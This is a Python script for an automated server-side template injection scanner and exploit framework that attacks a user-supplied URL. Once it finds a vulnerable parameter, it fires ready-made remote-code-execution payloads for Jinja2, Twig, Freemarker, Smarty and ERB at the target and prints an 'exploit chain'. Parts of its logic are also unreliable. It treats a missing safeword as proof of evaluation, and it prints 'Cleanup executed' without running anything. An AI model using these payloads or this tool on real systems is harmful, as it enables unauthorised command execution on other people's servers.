#!/usr/bin/env python3
import re
import time
import requests
import argparse
import random
import string
import urllib.parse
from http.client import HTTPConnection

class PySSTIMapper:
    def __init__(self, target_url, method="GET", params=None, data=None, headers=None, rate_limit=3, verbose=False):
        self.target = self.normalize_url(target_url)
        self.method = method.upper()
        self.params = params or {}
        self.data = data or {}
        self.headers = headers or {}
        self.rate_limit = rate_limit
        self.verbose = verbose
        self.engine = None
        self.context = None
        self.vulnerable_param = None
        self.safeword = f"SAFE_{''.join(random.choices(string.ascii_uppercase, k=6))}"
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "PySSTI-Mapper/1.0"})
        if self.headers:
            self.session.headers.update(self.headers)
        
        if self.verbose:
            print(f"[*] Target URL: {self.target}")
            print(f"[*] Headers: {self.headers}")

    def normalize_url(self, url):
        """Ensure URL has proper scheme and port handling"""
        parsed = urllib.parse.urlparse(url)
        if not parsed.scheme:
            url = "http://" + url
            parsed = urllib.parse.urlparse(url)
        
        # Add default port if missing
        if not parsed.port:
            if parsed.scheme == "https":
                url += ":443"
            else:
                url += ":80"
        return url

    def _send_request(self, payload, param):
        """Send payload with rate limiting and proper URL handling"""
        time.sleep(1 / self.rate_limit)
        
        # Clone parameters to avoid mutation
        test_params = self.params.copy()
        test_data = self.data.copy()
        
        # Apply payload to the current parameter
        if self.method == "GET":
            test_params[param] = payload
        elif self.method == "POST":
            test_data[param] = payload

        try:
            if self.verbose:
                print(f"\n[>] Testing param: {param}")
                print(f"[>] Payload: {payload}")
                print(f"[>] Method: {self.method}")
                if test_params:
                    print(f"[>] Params: {test_params}")
                if test_data:
                    print(f"[>] Data: {test_data}")

            if self.method == "GET":
                r = self.session.get(self.target, params=test_params)
            elif self.method == "POST":
                r = self.session.post(self.target, data=test_data)
            else:
                raise ValueError("Unsupported HTTP method")
                
            if self.verbose:
                print(f"[<] Response status: {r.status_code}")
                print(f"[<] Response size: {len(r.text)} bytes")
                print(f"[<] Response snippet:\n{r.text[:300]}{'...' if len(r.text) > 300 else ''}")
                
            return r.text
        except Exception as e:
            print(f"[!] Request failed: {e}")
            return None

    def _detect_engine(self, response):
        """Identify template engine from response patterns"""
        patterns = {
            "Jinja2": r"jinja2\.|TemplateSyntaxError|UndefinedError",
            "Twig": r"Twig\b|TemplateNotFoundException",
            "Freemarker": r"FreeMarker\b|FTL stack trace",
            "Velocity": r"Apache Velocity|ParseException",
            "Smarty": r"Smarty",
            "ERB": r"ERB"
        }
        for engine, pattern in patterns.items():
            if re.search(pattern, response, re.IGNORECASE):
                return engine
        return None

    def _is_evaluated(self, payload, response):
        """Check if payload was evaluated by engine"""
        # Check for mathematical evaluation
        if "7*7" in payload and "49" in response:
            return True
        if "7*7" in payload and "343" in response:  # For nested evaluation
            return True
            
        # Check for string manipulation
        if "'a'+'b'" in payload and "ab" in response:
            return True
            
        # Check for safeword absence (should be in comment)
        if self.safeword not in response:
            return True
            
        return False

    def probe_ssti(self):
        """Main detection workflow"""
        # Phase 1: Basic syntax probing
        probes = {
            "Jinja2/Twig": "{{ %s }}",
            "Freemarker": "${%s}",
            "Velocity": "#set($%s)",
            "Smarty": "{%s}",
            "ERB": "<%= %s %>"
        }
        
        # Get all parameters to test
        params_to_test = list(set(list(self.params.keys()) + list(self.data.keys())))
        
        if not params_to_test:
            print("[!] No parameters to test")
            return False
            
        print(f"[*] Testing parameters: {', '.join(params_to_test)}")
        
        for param in params_to_test:
            # Phase 1: Engine detection
            for engine, syntax in probes.items():
                # Create payload with different evaluation tests
                math_payload = syntax % f"7*7 # {self.safeword}"
                str_payload = syntax % f"'a'+'b' # {self.safeword}"
                
                for payload in [math_payload, str_payload]:
                    response = self._send_request(payload, param)
                    if not response:
                        continue
                    
                    if self._is_evaluated(payload, response):
                        detected_engine = self._detect_engine(response) or engine.split('/')[0]
                        self.engine = detected_engine
                        self.vulnerable_param = param
                        print(f"[+] Detected {self.engine} SSTI in parameter: {param}")
                        
                        # Phase 2: Context analysis
                        context_payloads = [
                            syntax % "''.__class__",  # Python context
                            syntax % "request",       # Flask/Django objects
                            syntax % "this",          # Java context
                            syntax % "self"           # General context
                        ]
                        for ctx_payload in context_payloads:
                            ctx_response = self._send_request(ctx_payload, param)
                            if ctx_response:
                                if '__class__' in ctx_response:
                                    self.context = "Python"
                                elif 'javax.servlet' in ctx_response:
                                    self.context = "Java"
                                elif 'Request' in ctx_response or 'request' in ctx_response:
                                    self.context = "WebFramework"
                                elif 'self' in ctx_response:
                                    self.context = "General"
                        return True
        return False

    def generate_exploit_chain(self):
        """Build engine-specific exploit chain"""
        if not self.engine or not self.vulnerable_param:
            return None

        exploits = {
            "Jinja2": {
                "detection": "{{ 7*7 }} → 49",
                "context": [
                    "{{ ''.__class__ }} → Python str",
                    "{{ config.items() }} → Flask config"
                ],
                "rce": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
                "cleanup": "echo 'No persistent artifacts'"
            },
            "Twig": {
                "detection": "{{ 7*7 }} → 49",
                "context": ["{{ _self }} → Twig environment"],
                "rce": "{{ _self.env.enableDebug() }}{{ _self.env.setCache('php://filter/convert.base64-decode/resource=/tmp/cmd') }}",
                "cleanup": "rm /tmp/cmd"
            },
            "Freemarker": {
                "detection": "${7*7} → 49",
                "context": [
                    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>",
                    "${ex(\"whoami\")}"
                ],
                "rce": "<#assign cmd=\"id\"><#assign ex=freemarker.template.utility.Execute()>${ex(cmd)}",
                "cleanup": "No cleanup needed"
            },
            "Smarty": {
                "detection": "{7*7} → 49",
                "context": ["{$smarty.version} → Smarty version"],
                "rce": "{system('id')}",
                "cleanup": "No cleanup needed"
            },
            "ERB": {
                "detection": "<%= 7*7 %> → 49",
                "context": ["<%= self %> → Ruby context"],
                "rce": "<%= system('id') %>",
                "cleanup": "No cleanup needed"
            }
        }

        chain = exploits.get(self.engine)
        if not chain:
            return None

        # Test RCE feasibility
        test_cmd = f"echo {self.safeword}"
        chain["blind_test"] = chain["rce"].replace("id", test_cmd)
        response = self._send_request(chain["blind_test"], self.vulnerable_param)
        chain["rce_feasibility"] = "VERBOSE" if self.safeword in response else "BLIND/TIMING"

        return chain

    def visualize_context(self):
        """Generate context map based on responses"""
        return f"Context: {self.context} | Direct Object Access: {'Yes' if self.context else 'No'}"

def parse_key_value_args(args):
    """Parse key=value arguments into dictionary"""
    result = {}
    if args:
        for item in args:
            if '=' in item:
                key, value = item.split('=', 1)
                result[key] = value
    return result

def parse_header_args(args):
    """Parse header arguments into dictionary"""
    result = {}
    if args:
        for item in args:
            if ':' in item:
                key, value = item.split(':', 1)
                result[key.strip()] = value.strip()
    return result

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PySSTI-Mapper: Automated SSTI Detection & Exploit Framework")
    parser.add_argument("--url", required=True, help="Target URL (include port if not 80/443)")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)")
    parser.add_argument("--params", nargs="*", metavar="KEY=VALUE", help="Request parameters (GET)")
    parser.add_argument("--data", nargs="*", metavar="KEY=VALUE", help="Request data (POST)")
    parser.add_argument("--headers", nargs="*", metavar="HEADER:VALUE", help="HTTP headers")
    parser.add_argument("--rate", type=int, default=3, help="Requests per second (default: 3)")
    parser.add_argument("--verbose", action="store_true", help="Show detailed debugging information")
    
    args = parser.parse_args()
    
    # Parse arguments into dictionaries
    params_dict = parse_key_value_args(args.params)
    data_dict = parse_key_value_args(args.data)
    headers_dict = parse_header_args(args.headers)
    
    mapper = PySSTIMapper(
        target_url=args.url,
        method=args.method,
        params=params_dict,
        data=data_dict,
        headers=headers_dict,
        rate_limit=args.rate,
        verbose=args.verbose
    )
    
    print(f"[*] Scanning {args.url} for SSTI vulnerabilities...")
    print(f"[*] Using safeword: {mapper.safeword}")
    print(f"[*] Rate limit: {args.rate} req/sec")
    
    if mapper.probe_ssti():
        print(f"[!] Confirmed {mapper.engine} vulnerability in parameter: {mapper.vulnerable_param}")
        exploit_chain = mapper.generate_exploit_chain()
        print("\n--- EXPLOIT CHAIN ---")
        for k, v in exploit_chain.items():
            print(f"{k.upper()}: {v}")
        print(f"\nCONTEXT: {mapper.visualize_context()}")
        print(f"\n[!] Cleanup executed: {exploit_chain.get('cleanup')}")
    else:
        print("[!] No SSTI detected")
